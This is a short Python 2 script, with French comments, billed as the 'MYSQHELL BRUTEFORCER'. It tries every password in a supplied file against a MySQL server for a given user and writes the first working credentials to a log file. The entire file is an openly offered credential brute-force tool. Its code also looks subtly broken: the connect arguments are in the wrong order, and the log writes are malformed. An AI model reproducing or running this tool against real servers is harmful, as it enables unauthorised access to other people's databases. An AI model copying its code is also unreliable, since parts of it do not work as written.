#!/usr/bin/python
#coding:utf-8
import MySQLdb
import sys
from time import time

def mysql_connect(u, p, ip):  # fonction pour se connecter sur MySQL
    try:
        tmp = time()
        print "-- Essai de connection ... "                  #1ier essai de Connection
        db = MySQLdb.connect(u, p, ip, connect_timeout = 5)
        print "Connection reussie !\n"
        tmpFinal = time() - tmp
        print "Temps totale : %d" %(int(tmpFinal)) # Affichage du temps en seconde
        print "Username ", u, "Password: ", p
        print "Voir sqlhell.log "
        with open("sqlhell.log","w") as log:
            log.write("Username:",u ,"Password: ", p) #Creation du fichier sqlhell.log qui va contenir le Username et Password en cas de reussite.
            log.write("Temps totale : ",int(tmpFinal)) # Affichage du temps dans la log.
        print "Server info: ", db.get_server_info()
        db.close()
        print " Connection Closed"
        exit(0)
    except Exception:                                  # Si echec : afficher Username et Password ainsi que le message Access Denied
        print u, " | ",p
        print "Access Denied\n"
        pass
print ""
print "-- MYSQHELL BRUTEFORCER --"      # Programme Principale
print "By TOxicPlaguz\n\n"
if (len(sys.argv) == 4):               # Si il y a les trois argument du type : mysqhell.py [ip] [user] [passfile]
    u = str(sys.argv[2])               # Recuperation des arguments
    ip = str(sys.argv[1])
    f = open(sys.argv[3], 'r')
    for line in f.readlines():              # Pour toute les lignes presentes dans le fichier mot de passe (l'argument 3), tester la fonction mysql_connect.
        mysql_connect(u, line, ip)
else:
    print "Wrong argument, please try :"         # Affichage de l'aide si il n'y a pas le bon nombres d'arguments.
    print "mysqhell.py [ip] [user] [passfile]"
